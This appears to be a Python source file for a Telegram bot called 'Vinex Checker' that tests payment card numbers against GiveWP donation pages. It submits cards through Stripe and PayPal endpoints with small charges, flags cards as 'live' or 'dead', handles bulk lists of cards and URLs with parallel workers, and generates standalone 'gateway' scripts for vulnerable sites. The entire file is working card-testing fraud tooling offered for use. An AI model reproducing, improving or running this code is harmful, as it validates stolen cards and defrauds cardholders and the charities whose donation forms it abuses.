            fd = {"give-form-id-prefix":ID_FORM1,"give-form-id":ID_FORM2,"give-form-hash":NONCE,"give-amount":amt,"give-currency":CURRENCY,"payment-mode":mode,"give-gateway":mode,"give_first":random.choice(FIRST_NAMES),"give_last":random.choice(LAST_NAMES),"give_email":self.email,"give_agree_to_terms":"on"}
            if pid is not None: fd["give-price-id"] = pid
            fd = self._autofill(fd)
            da = MultipartEncoder({k:(None,str(v)) for k,v in fd.items()})
            r = self.r.post(AJAX_URL, params={"action":"give_paypal_commerce_approve_order","order":oid}, headers={"content-type":da.content_type,"x-requested-with":"XMLHttpRequest","referer":PAGE_URL,"origin":"https://"+HOST}, data=da, timeout=20)
            return r.text or ""
        except: return ""
    def _stripe_charge(self, amt, n, mm, yy, cvc, pid=None, mode='stripe'):
        if not STRIPE_PK: return None, 'STRIPE_SKIP_NO_PK'
        token = None; pm = None
        try:
            r = self.r.post('https://api.stripe.com/v1/payment_methods', auth=(STRIPE_PK,''), data={'type':'card','card[number]':n,'card[exp_month]':str(mm),'card[exp_year]':str(yy),'card[cvc]':str(cvc)}, timeout=20)
            if r.status_code == 200:
                try: pm = r.json().get('id')
                except: pass
            else:
                try:
                    err = r.json().get('error', {}); msg = err.get('message','FAIL'); code = err.get('code','')
                    if code in ('card_declined','expired_card','insufficient_funds','incorrect_number','incorrect_cvc'): return f'{msg} ({code})', r.text
                    if 'expired' in msg.lower(): return 'Your card has expired', r.text
                except: pass
        except: pass
        if not pm:
            try:
                r2 = self.r.post('https://api.stripe.com/v1/tokens', auth=(STRIPE_PK,''), data={'card[number]':n,'card[exp_month]':str(mm),'card[exp_year]':str(yy),'card[cvc]':str(cvc)}, timeout=20)
                if r2.status_code == 200:
                    try: token = r2.json().get('id')
                    except: pass
            except: pass
        if not token and not pm: return None, 'STRIPE_NO_TOKEN'
        fd = {"give-form-id-prefix":ID_FORM1,"give-form-id":ID_FORM2,"give-form-hash":NONCE,"give-amount":amt,"give-currency":CURRENCY,"payment-mode":mode,"give-gateway":mode,"give_first":random.choice(FIRST_NAMES),"give_last":random.choice(LAST_NAMES),"give_email":self.email,"give_agree_to_terms":"on"}
        if token: fd['stripe_token'] = token; fd['give_stripe_token'] = token
        if pm: fd['give_stripe_payment_method'] = pm; fd['payment_method_id'] = pm
        if pid is not None: fd["give-price-id"] = pid
        fd = self._autofill(fd)
        da = MultipartEncoder({k:(None,str(v)) for k,v in fd.items()})
        for action in ['give_process_donation','give_stripe_process_payment_intent','give_stripe_javascript_payment_intent']:
            try:
                r = self.r.post(AJAX_URL, params={"action": action}, headers={"content-type":da.content_type,"x-requested-with":"XMLHttpRequest","referer":PAGE_URL,"origin":"https://"+HOST}, data=da, timeout=20)
                body = r.text or ''
                if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                real = extract_response_text(body)
                if real and is_card_decline(real): return real, body
                if real and 'not enabled' not in real.lower() and 'unknown action' not in real.lower(): return real, body
            except: continue
        return None, 'STRIPE_NO_RESPONSE'
    def Charge(self, ccx):
        try:
            parts = re.split(r"[|:/]", ccx.strip().replace(" ",""))
            if len(parts) < 4: return "INVALID_CARD_FORMAT"
            n = re.sub(r"\D","",parts[0]); mm = re.sub(r"\D","",parts[1]).zfill(2)
            yy = re.sub(r"\D","",parts[2]); cvc = re.sub(r"\D","",parts[3])
            if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
            yy = yy.zfill(2)
            if not luhn_check(n): return "INVALID_CARD_NUMBER"
            pairs = []
            if PRICE_LEVELS:
                for pid, amt in sorted(PRICE_LEVELS, key=lambda x: x[1]):
                    pairs.append((pid, "%0.2f" % amt))
            base_amts = set(a for _, a in pairs)
            for amt in BASE_AMOUNTS:
                if amt not in base_amts: pairs.append(("custom", amt))
            pairs = sorted(pairs, key=lambda x: float(x[1]))
            errors = []; best = None
            if STRIPE_PK:
                for pid, amt in pairs:
                    self.donation = amt
                    res, body = self._stripe_charge(amt, n, mm, yy, cvc, pid=pid)
                    if res: return res
                    if body: errors.append((amt, extract_response_text(body) or 'STRIPE_ERR'))
            for pid, amt in pairs:
                self.donation = amt
                oid, err = self._create(amt, pid, 'paypal-commerce')
                if not oid:
                    if err: errors.append((amt, err))
                    continue
                conf = self._confirm(oid, n, mm, yy, cvc)
                cr = extract_response_text(conf)
                if cr and is_card_decline(cr): return cr
                t = self._approve(oid, amt, pid, 'paypal-commerce') + "\n" + conf
                if '"success":true' in t.lower() and '"error"' not in t.lower(): return "CHARGE %s$" % amt
                raw = extract_response_text(t) or extract_response_text(conf)
                if raw and is_card_decline(raw) and not best: best = raw
            if best: return best[:300]
            if errors:
                _, last = errors[0]
                if last: return last[:300]
            return "ORDER_CREATE_FAILED"
        except Exception as e: return "FATAL_%s" % type(e).__name__

def single_check():
    print("\n--- Single ---")
    try:
        c = input("Card [default: %s]: " % TEST_CARD).strip()
        if not c: c = TEST_CARD
        p = PayPal(); print("->", p.Charge(c))
    except Exception as e: print("Err:", e)

def file_check():
    print("\n--- File ---")
    try:
        path = input("File: ").strip()
        if not os.path.exists(path): print("Not found"); return
        with open(path) as f: cards = [l.strip() for l in f if l.strip()]
        out = "vinex_%d.txt" % int(time.time())
        with open(out, "w") as fo:
            for i, c in enumerate(cards, 1):
                try:
                    p = PayPal(); r = p.Charge(c); line = "%s => %s" % (c, r)
                    print("[%d/%d] %s" % (i, len(cards), line))
                    fo.write(line+"\n"); fo.flush()
                except: pass
        print("Saved:", out)
    except Exception as e: print("Err:", e)

def main():
    print("VINEX Gateway v23.1 | " + PAGE_URL)
    print("Stripe PK:", STRIPE_PK or "none")
    print("Prices:", PRICE_LEVELS)
    while True:
        try:
            c = input("\n[1] Single [2] File [0] Exit: ").strip()
            if c == "1": single_check()
            elif c == "2": file_check()
            elif c == "0": break
        except (KeyboardInterrupt, EOFError): break
        except: continue

if __name__ == "__main__":
    try: main()
    except: pass
'''

_GATEWAY_TEMPLATE = Template(GATEWAY_TEMPLATE_STR)

def generate_gateway_code(result, link, tester=None):
    link = link or 'https://invalid.local/'
    def g(a, d=''):
        try:
            if tester and getattr(tester, a, None): return getattr(tester, a)
            return d
        except: return d
    p = urlparse(link); host = p.netloc or 'invalid.local'
    pl = tester.price_levels if tester and tester.price_levels else []
    ff = tester.form_fields if tester and tester.form_fields else {}
    return _GATEWAY_TEMPLATE.safe_substitute(
        page_url=link, ajax_url=g('ajax_url') or f'https://{host}/wp-admin/admin-ajax.php',
        id_form1=g('id_form1'), id_form2=g('id_form2'), nonce=g('nonce'),
        access_token=g('au'), paypal_meta=g('paypal'), client_id=g('client_id'),
        stripe_pk=g('stripe_pk'), currency=g('currency', 'USD'), minimum=g('minimum', '5.00'),
        current_pid=g('current_price_id'),
        price_levels_json=repr(pl), form_fields_json=repr(ff),
    )

# ═══════════ BOT HANDLERS ═══════════
@bot.message_handler(commands=['start'])
def cmd_start(message):
    try:
        save_user(message.from_user.id)
        react_to(message, '🔥')
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        name = message.from_user.first_name or 'User'
        text = (
            f'[⚡] {SB("Welcome to Vinex v23.1")} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("User", f"{name} [VIP]")}\n'
            f'{vt("ID", f"<code>{uid}</code>")}\n'
            f'{vt("Status", B("Online"))} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'{vt("Bulk", "<code>/mass</code>")}\n'
            f'{vt("Resume", "<code>/resume</code>")}\n'
            f'{vt("Stop", "<code>/stop</code>")}\n'
            f'{vt("Stats", "<code>/stats</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vsep()}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
            f'{vt("Gateways", "Stripe + PayPal (4 modes) + Raw")}\n'
            f'{vt("Workers", "8 Parallel")}\n'
            f'{vt("TestCard", "<code>4232...903</code>")}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Stats', 'success', 'record', callback_data='stats'),
               vinex_btn('Help', 'success', 'gear', callback_data='help'))
        kb.add(vinex_btn('Quick Scan', 'primary', 'play', callback_data='howto_paypal'),
               vinex_btn('Bulk Scan', 'primary', 'gift', callback_data='howto_mass'))
        kb.add(vinex_btn('Try Luck', 'primary', 'party', callback_data='luck'),
               vinex_btn('Stop', 'danger', 'stop', callback_data='stop'))
        kb.add(vinex_btn('Emoji Pack', 'primary', 'laugh', callback_data='emojis'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except: log.exception('cmd_start')

@bot.message_handler(commands=['help'])
def cmd_help(message):
    try:
        react_to(message, '💡')
        text = (
            f'[⚡] {SB("Vinex Manual v23.1")} {ve("gear")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'  {SB("→")} Stripe + PayPal (4 modes) + Raw Card\n'
            f'  {SB("→")} Amounts: 1$ → 3$ → 5$\n'
            f'  {SB("→")} Real gateway shown in Actual\n'
            f'{vt("Bulk", "<code>/mass</code> + .txt — 8 parallel")}\n'
            f'{vt("Control", "<code>/stop</code> / <code>/resume</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vsep()}\n'
            f'{vt("TestCard", TEST_CARD)}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except: pass

@bot.message_handler(commands=['ping'])
def cmd_ping(message):
    try:
        t0 = time.time()
        sent = safe_send_message(message.chat.id, '🏓 Pinging...')
        dt = (time.time() - t0) * 1000
        if sent:
            safe_edit_message(message.chat.id, sent.message_id,
                f'[⚡] {SB("PONG")}\n{vsep()}\n'
                f'{vt("Latency", f"<code>{dt:.0f} ms</code>")}\n'
                f'{vt("Bot", "VINEX v23.1")}\n'
                f'{vt("Workers", "8")}\n'
                f'{vt("TestCard", TEST_CARD)}')
    except: pass

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    try:
        react_to(message, '📊')
        s = load_stats()
        users_n = len(open(USERS_FILE).read().splitlines())
        rate = (s.get('live', 0) / s.get('checks', 1) * 100 if s.get('checks', 0) else 0)
        filled = int(rate / 5); bar = '█' * filled + '░' * (20 - filled)
        text = (
            f'[⚡] {SB("Global Stats")} {ve("record")}\n{vsep()}\n'
            f'{vt("Users", f"<code>{users_n}</code>")}\n'
            f'{vt("Checks", f"<code>{s.get(chr(99)+chr(104)+chr(101)+chr(99)+chr(107)+chr(115),0)}</code>")}\n'
            f'{vt("Live", f"<code>{s.get(chr(108)+chr(105)+chr(118)+chr(101),0)}</code>")} {ve("party")}\n'
            f'{vt("Dead", f"<code>{s.get(chr(100)+chr(101)+chr(97)+chr(100),0)}</code>")} {ve("ban")}\n'
            f'{vt("Rate", f"<code>{rate:.1f}%</code>")}\n{vsep()}\n'
            f'<code>{bar}</code> {B(str(round(rate)) + "%")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Menu', 'primary', 'play', callback_data='back_start'),
               vinex_btn('Luck', 'success', 'party', callback_data='luck'))
        safe_send_message(message.chat.id, text, reply_markup=kb)
    except: pass

@bot.message_handler(commands=['luck'])
def cmd_luck(message):
    try:
        react_to(message, '🎲')
        d = send_dice(message.chat.id, '🎲')
        if d:
            time.sleep(3)
            val = d.dice.value if hasattr(d, 'dice') else 0
            if val >= 5: safe_send_message(message.chat.id, f'🎉 Lucky! <code>{val}</code>', effect=EFFECT_FIRE)
            else: safe_send_message(message.chat.id, f'🎲 Rolled <code>{val}</code>')
    except: pass

@bot.message_handler(commands=['mood'])
def cmd_mood(message):
    try:
        react_to(message, '🎉')
        send_dice(message.chat.id, random.choice(['🎲','🎯','⚽','🏀','🎳','🎰']))
    except: pass

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def cmd_paypal(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_paypal[uid] < PAYPAL_COOLDOWN: return
        user_last_paypal[uid] = now
        chat_id = message.chat.id
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_send_message(chat_id, f'[⚡] {B("Usage")}: <code>/paypal URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(chat_id, f'[⚡] {B("Invalid link")}.')
            return
        lkey = f'{uid}:{normalize_url_key(link)}'
        if lkey in link_cooldowns:
            if now - link_cooldowns[lkey] < LINK_COOLDOWN:
                rem = int(LINK_COOLDOWN - (now - link_cooldowns[lkey]))
                safe_send_message(chat_id, f'[⚡] {B("Cooling")}: {rem}s')
                return
        link_cooldowns[lkey] = now
        react_to(message, '⚡')
        show_typing(chat_id, 'typing', duration=3.0)
        ko = safe_send_message(chat_id,
            f'[⚡] {SB("Vinex Scanning")}\n{vsep()}\n'
            f'{vt("Target", f"<code>{link[:80]}</code>")}\n'
            f'{vt("Engine", "v23.1 Universal")}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
            f'{vsep()}\n[⚡] {ve("gear")} {SB("Running Pipeline")}...')
        if not ko: return

        bump_stat('checks')
        tester = VinexTester(link)
        tester.Key()
        result = tester.Charge(TEST_CARD, thorough=True)
        live = is_live_response(result) and not is_dead_response(result)
        user_name = message.from_user.first_name or 'User'

        if not live:
            bump_stat('dead')
            react_to(message, '😢')
            resp_text = normalize_result(result)[:300]
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("Dead Detected")} {ve("ban")}\n{vsep()}\n'
                f'{vt("User", f"{user_name} [VIP]")}\n'
                f'{vt("Status", B("Dead"))} {ve("ban")}\n'
                f'{vt("Response", f"<code>{resp_text}</code>")}\n'
                f'{vt("Detected", f"#{tester.gateway_type}")}\n'
                f'{vt("Actual", f"#{tester.response_gateway or chr(45)}")}\n'
                f'{vt("Prices", f"<code>{len(tester.price_levels)}</code>")}\n'
                f'{vsep()}\n[⚡] {SB("Vinex")} - {B("Checker")}')
            return

        bump_stat('live')
        react_to(message, '🔥')
        show_typing(chat_id, 'upload_document', duration=2.0)

        try:
            code = generate_gateway_code(result, link, tester)
            if not code or len(code) < 500: raise Exception(f'Too small')
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id, f'[⚡] {SB("Error")}: <code>{str(e)[:200]}</code>')
            return

        fname = f'vinex_v23_1_{int(time.time())}_{uid}.py'
        try:
            with open(fname, 'w', encoding='utf-8') as f: f.write(code)
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id, f'[⚡] {SB("File Error")}: <code>{str(e)[:200]}</code>')
            return

        display = normalize_result(result)[:250]
        is_charge = 'CHARGE' in str(result).upper()
        status = 'Charged' if is_charge else 'Approved'
        head = (f'[⚡] {SB("Charged")} {ve("party")} {ve("cash")}' if is_charge else f'[⚡] {SB("Hit Detected")} {ve("party")}')
        prices_count = len(tester.price_levels)
        cur_pid = tester.current_price_id or '—'
        actual_gw = tester.response_gateway or '—'

        caption = (
            f'{head}\n{vsep()}\n'
            f'{vt("User", f"{user_name} [VIP]")}\n'
            f'{vt("Status", B(status))} {ve("party")}\n'
            f'{vt("Response", f"<code>{display}</code>")}\n'
            f'{vt("Amount", f"<code>${tester.donation} {tester.currency}</code>")}\n'
            f'{vt("Detected", f"<code>#{tester.gateway_type}</code>")}\n'
            f'{vt("Actual", f"<code>#{actual_gw}</code>")}\n'
            f'{vt("Prices", f"<code>{prices_count} levels</code>")}\n'
            f'{vt("CurPID", f"<code>{cur_pid}</code>")}\n'
            f'{vsep()}\n[⚡] {SB("Vinex")} - {B("Checker")}'
        )

        sent = None
        for attempt in range(3):
            try:
                with open(fname, 'rb') as f:
                    kw = {'chat_id': chat_id, 'document': f, 'timeout': 180}
                    if attempt == 0:
                        kw['caption'] = caption; kw['parse_mode'] = 'HTML'
                        try: kw['message_effect_id'] = EFFECT_FIRE
                        except: pass
                    elif attempt == 1: kw['caption'] = re.sub(r'<[^>]+>', '', caption)[:1024]
                    sent = bot.send_document(**kw)
                if sent: break
            except: continue

        if sent:
            safe_edit_message(chat_id, ko.message_id, f'[⚡] {SB("Delivered")} {ve("party")}')
            try: send_dice(chat_id, '🎉')
            except: pass
            try: os.remove(fname)
            except: pass
        else:
            safe_send_message(chat_id, f'{caption}\n\n[⚡] {SB("File delivery failed")}')
    except: log.exception('cmd_paypal')

@bot.message_handler(commands=['mass'])
def cmd_mass(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_mass[uid] < MASS_COOLDOWN: return
        user_last_mass[uid] = now
        if mass_active.get(uid, False):
            safe_send_message(message.chat.id, '⚠️ Job running. /stop first.')
            return
        msg = safe_send_message(message.chat.id,
            f'[⚡] {SB("Bulk Mode")}\n{vsep()}\n'
            f'{vt("Format", "One URL per line")}\n'
            f'{vt("Max", "10 MB")}\n'
            f'{vt("Workers", "8 Parallel")}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}')
        if msg: bot.register_next_step_handler(msg, handle_mass_file)
    except: log.exception('cmd_mass')

@bot.message_handler(commands=['resume'])
def cmd_resume(message):
    try:
        uid = message.from_user.id
        chat_id = message.chat.id
        progress = load_progress(uid)
        if not progress:
            safe_send_message(chat_id, f'[⚡] {B("No saved progress")}.')
            return
        total = progress.get('total', 0)
        processed = progress.get('processed', 0)
        if processed >= total:
            safe_send_message(chat_id, f'✅ Complete ({processed}/{total})')
            clear_progress(uid); return
        links = progress.get('links', [])
        safe_send_message(chat_id, f'♻️ Resuming {processed}/{total}...')
        threading.Thread(target=run_mass_job, args=(chat_id, uid, links, processed, progress), daemon=True).start()
    except: log.exception('cmd_resume')

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    try:
        uid = message.from_user.id
        if mass_active.get(uid, False):
            mass_pause[uid] = True
            safe_send_message(message.chat.id, '🛑 Stopping...')
        else: safe_send_message(message.chat.id, '❌ No active job.')
    except: pass

def handle_mass_file(message):
    try:
        if not message.document:
            safe_send_message(message.chat.id, '❌ Send a .txt file.')
            return
        size = message.document.file_size or 0
        if size > MAX_FILE_SIZE:
            safe_send_message(message.chat.id, f'❌ File too large')
            return
        uid = message.from_user.id
        chat_id = message.chat.id
        try: fi = retry_call(bot.get_file, message.document.file_id, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Network: <code>{str(e)[:150]}</code>'); return
        try: data = retry_call(bot.download_file, fi.file_path, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Download: <code>{str(e)[:150]}</code>'); return
        if not data:
            safe_send_message(chat_id, '❌ Empty file.'); return
        raw = data.decode('utf-8', errors='ignore').splitlines()
        links = []; seen = set(); dupes = 0
        for line in raw:
            s = safe_url(line.strip())
            if not s: continue
            k = normalize_url_key(s)
            if k in seen: dupes += 1; continue
            seen.add(k); links.append(s)
        if not links:
            safe_send_message(chat_id, '❌ No valid URLs.'); return
        total = len(links)
        progress = {'total': total, 'processed': 0, 'live': 0, 'dead': 0, 'links': links, 'started_at': time.time()}
        save_progress(uid, progress)
        dupe_msg = f'\n🗑️ Duplicates: <code>{dupes}</code>' if dupes else ''
        safe_send_message(chat_id,
            f'[⚡] {SB("Ready")} {ve("party")}\n{vsep()}\n'
            f'{vt("Loaded", f"<code>{total}</code> unique")}{dupe_msg}\n'
            f'{vt("Mode", "THOROUGH")}\n'
            f'{vt("Workers", "8 Parallel")}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}\n{vsep()}\n'
            f'{ve("sound")} {SB("Launching")}...')
        threading.Thread(target=run_mass_job, args=(chat_id, uid, links, 0, progress), daemon=True).start()
    except: log.exception('handle_mass_file')

def run_mass_job(chat_id, uid, links, start_idx, progress):
    total = len(links); processed = start_idx; live = progress.get('live', 0); dead = progress.get('dead', 0)
    started_at = progress.get('started_at', time.time())
    mass_active[uid] = True; mass_pause[uid] = False
    results_file = RESULTS_TMPL.format(uid, int(started_at))
    live_dir = LIVE_DIR_TMPL.format(uid, int(started_at))
    try: os.makedirs(live_dir, exist_ok=True)
    except: pass
    status_msg = safe_send_message(chat_id,
        f'[⚡] {SB("Mass Scan Running")}\n{vsep()}\n'
        f'{vt("Total", f"<code>{total}</code>")}\n'
        f'{vt("Mode", "PARALLEL x8")}\n⏳ Starting...')
    state = {'last_link': '', 'last_resp': '', 'last_live': False, 'live_idx': 0}
    lock = threading.Lock()
    def status_loop():
        while mass_active.get(uid, False):
            try:
                if not status_msg: time.sleep(2); continue
                with lock:
                    p = processed; l = live; d = dead
                    lk = state['last_link']; lr = state['last_resp']; ll = state['last_live']
                pct = int((p / total) * 100) if total else 0
                elapsed = time.time() - started_at
                spd = p / elapsed if elapsed else 0
                eta = (total - p) / spd if spd > 0 else 0
                filled = int((pct / 100) * 20)
                bar = '█' * filled + '░' * (20 - filled)
                if lk:
                    icon = '✅' if ll else '❌'
                    last = f"{icon} <b>Last:</b>\n<code>{lk[:60]}</code>\n💬 {lr[:60]}"
                else: last = '⏳ Waiting...'
                text = (f'[⚡] {SB("Mass Scan")}\n{vsep()}\n'
                        f'{vt("Total", f"<code>{total}</code>")}\n'
                        f'{vt("Live", f"<code>{l}</code>")} {ve("party")}\n'
                        f'{vt("Dead", f"<code>{d}</code>")}\n'
                        f'{vt("Progress", f"{pct}%")}\n<code>{bar}</code>\n'
                        f'{vsep()}\n{last}\n{vsep()}\n'
                        f'{vt("Speed", f"<code>{spd:.2f}/s</code>")}\n'
                        f'{vt("ETA", f"{int(eta // 60)}m{int(eta % 60)}s")}')
                safe_edit_message(chat_id, status_msg.message_id, text)
            except: pass
            time.sleep(2)
    threading.Thread(target=status_loop, daemon=True).start()
    def process_one(idx):
        if mass_pause.get(uid, False):
            return {'idx': idx, 'skipped': True}
        try:
            result = check_single_link(links[idx], thorough=True)
            return {'idx': idx, 'result': result, 'skipped': False}
        except Exception:
            return {'idx': idx, 'result': {'link': links[idx][:100], 'live': False, 'respons': 'FATAL', 'tester': None}, 'skipped': False}
    try:
        max_workers = min(PARALLEL_WORKERS, max(1, total - start_idx))
        log.info(f'Parallel: {max_workers} workers')
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {}
            for idx in range(start_idx, total):
                if mass_pause.get(uid, False): break
                futures[executor.submit(process_one, idx)] = idx
            for future in as_completed(futures):
                if mass_pause.get(uid, False):
                    for f in futures: f.cancel()
                    break
                outcome = future.result()
                if outcome.get('skipped'): continue
                result = outcome['result']
                resp = normalize_result(result.get('respons', 'Unknown'))[:100]
                is_live = result.get('live', False)
                with lock:
                    processed += 1
                    state['last_link'] = links[outcome['idx']]
                    state['last_resp'] = resp
                    state['last_live'] = is_live
                    try:
                        with open(results_file, 'a', encoding='utf-8') as f:
                            f.write(f'{links[outcome["idx"]]} => {result.get("respons", "unknown")}\n')
                    except: pass
                    bump_stat('checks')
                    if is_live:
                        live += 1; state['live_idx'] += 1; bump_stat('live')
                        lv_idx = state['live_idx']
                    else:
                        dead += 1; bump_stat('dead'); lv_idx = 0
                if is_live:
                    try:
                        tester = result.get('tester')
                        code = generate_gateway_code(result['respons'], result['link'], tester)
                        gpath = os.path.join(live_dir, f'gateway_{lv_idx}.py')
                        with open(gpath, 'w', encoding='utf-8') as f: f.write(code)
                        cur = tester.currency if tester else 'USD'
                        actual_gw = (tester.response_gateway if tester else None) or 'unknown'
                        caption = (f'[⚡] {SB("LIVE")} #{lv_idx} {ve("party")}\n{vsep()}\n'
                                   f'{vt("URL", f"<code>{result["link"][:80]}</code>")}\n'
                                   f'{vt("Response", resp[:80])}\n'
                                   f'{vt("Amount", f"<code>${result.get(chr(97)+chr(109)+chr(111)+chr(117)+chr(110)+chr(116), chr(49)+chr(46)+chr(48)+chr(48))} {cur}</code>")}\n'
                                   f'{vt("Gateway", f"<code>#{actual_gw}</code>")}\n{vsep()}\n'
                                   f'[⚡] {SB("Vinex")} - {B("Checker")}')
                        sent = safe_send_document(chat_id, gpath, caption=caption)
                        if sent:
                            try: os.remove(gpath)
                            except: pass
                    except: log.exception('live delivery')
                if processed % 10 == 0:
                    progress['processed'] = processed; progress['live'] = live; progress['dead'] = dead
                    save_progress(uid, progress)
        progress['processed'] = processed; progress['live'] = live; progress['dead'] = dead
        save_progress(uid, progress)
        rate = int((live / total) * 100) if total else 0
        final = (f'[⚡] {SB("Mass Complete")} {ve("party")}\n{vsep()}\n'
                 f'{vt("Total", f"<code>{total}</code>")}\n'
                 f'{vt("Live", f"<code>{live}</code>")} {ve("party")}\n'
                 f'{vt("Dead", f"<code>{dead}</code>")}\n'
                 f'{vt("Rate", f"<code>{rate}%</code>")}\n'
                 f'{vt("Results", f"<code>{results_file}</code>")}')
        if status_msg: safe_edit_message(chat_id, status_msg.message_id, final)
        else: safe_send_message(chat_id, final)
        clear_progress(uid)
    except Exception:
        log.exception('run_mass_job')
        progress['processed'] = processed; progress['live'] = live; progress['dead'] = dead
        save_progress(uid, progress)
        safe_send_message(chat_id, f'⚠️ Crashed at {processed}/{total}\n♻️ /resume')
    finally: mass_active[uid] = False

@bot.message_handler(commands=['diag'])
def cmd_diag(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            safe_send_message(message.chat.id, '❌ Admin only.'); return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send_message(message.chat.id, 'Usage: <code>/diag URL</code>'); return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(message.chat.id, '❌ Invalid link.'); return
        msg = safe_send_message(message.chat.id, '🔬 Diagnosing...')
        if not msg: return
        tester = VinexTester(link)
        tester.Key()
        cf_info = '✅' if tester.cf_solved else ('⚠️' if tester.cf_detected else '—')
        report = (
            f'[⚡] {SB("Diagnostics v23.1")}\n{vsep()}\n'
            f'{vt("URL", f"<code>{link[:80]}</code>")}\n'
            f'{vt("GW", f"<code>{tester.gateway_type}</code>")}\n'
            f'{vt("PayMode", f"<code>{tester.actual_payment_mode or chr(45)}</code>")}\n'
            f'{vt("Modes", f"<code>{chr(44).join(tester.enabled_modes) or chr(45)}</code>")}\n'
            f'{vt("PayPalModes", f"<code>{chr(44).join(tester.paypal_modes) or chr(45)}</code>")}\n'
            f'{vt("Form", f"<code>{tester.id_form2 or "NONE"}</code>")}\n'
            f'{vt("Nonce", f"<code>{tester.nonce or "NONE"}</code>")}\n'
            f'{vt("Prices", f"<code>{len(tester.price_levels)}</code>")}\n'
            f'{vt("StripePK", f"<code>{(tester.stripe_pk[:24]+chr(46)+chr(46)) if tester.stripe_pk else chr(45)}</code>")}\n'
            f'{vt("CardFields", f"<code>{len(tester.card_field_names)}</code>")}\n'
            f'{vt("GiveWP", "✅" if tester.is_givewp else "❌")}\n'
            f'{vt("CF", cf_info)}'
        )
        safe_edit_message(message.chat.id, msg.message_id, report)
    except: log.exception('cmd_diag')

@bot.callback_query_handler(func=lambda c: c.data == 'stats')
def cb_stats(call):
    try: bot.answer_callback_query(call.id, '📊'); cmd_stats(call.message)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'help')
def cb_help(call):
    try: bot.answer_callback_query(call.id); cmd_help(call.message)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'stop')
def cb_stop(call):
    try: bot.answer_callback_query(call.id, '🛑'); cmd_stop(call.message)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'luck')
def cb_luck(call):
    try: bot.answer_callback_query(call.id, '🎲'); cmd_luck(call.message)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_paypal')
def cb_howto_paypal(call):
    try:
        bot.answer_callback_query(call.id, '💡')
        safe_send_message(call.message.chat.id, f'[⚡] {SB("Ready")}\n\nType:\n<code>/paypal https://site.com/donate</code>', effect=EFFECT_HEART)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'howto_mass')
def cb_howto_mass(call):
    try:
        bot.answer_callback_query(call.id, '📦')
        safe_send_message(call.message.chat.id, f'[⚡] {SB("Bulk Mode")}\n\n1. /mass\n2. Upload .txt\n3. Watch 🚀', effect=EFFECT_THUMBS)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'emojis')
def cb_emojis(call):
    try:
        bot.answer_callback_query(call.id, '🎨')
        groups = {'Money': ['cash','moneybag','moneywings','money2'],
                  'Status': ['warn','stop','ban','shield','blue_bolt','rocket'],
                  'Fun': ['party','gift','laugh','smile','scream','grimace'],
                  'UI': ['play','pause','record','sound','gear','circle'],
                  'Misc': ['shop','soon','globe']}
        lines = [f'[⚡] {B(g)}:\n' + ' '.join(ve(k) for k in keys) for g, keys in groups.items()]
        text = f'[⚡] {SB("Vinex Emoji Pack")} {ve("party")}\n{vsep()}\n' + '\n\n'.join(lines) + f'\n{vsep()}\n{vt("Count", f"<code>{len(VINEX_CE)}</code>")}'
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(call.message.chat.id, text, reply_markup=kb, effect=EFFECT_FIRE)
    except: pass

@bot.callback_query_handler(func=lambda c: c.data == 'back_start')
def cb_back_start(call):
    try:
        bot.answer_callback_query(call.id)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        cmd_start(call.message)
    except: pass

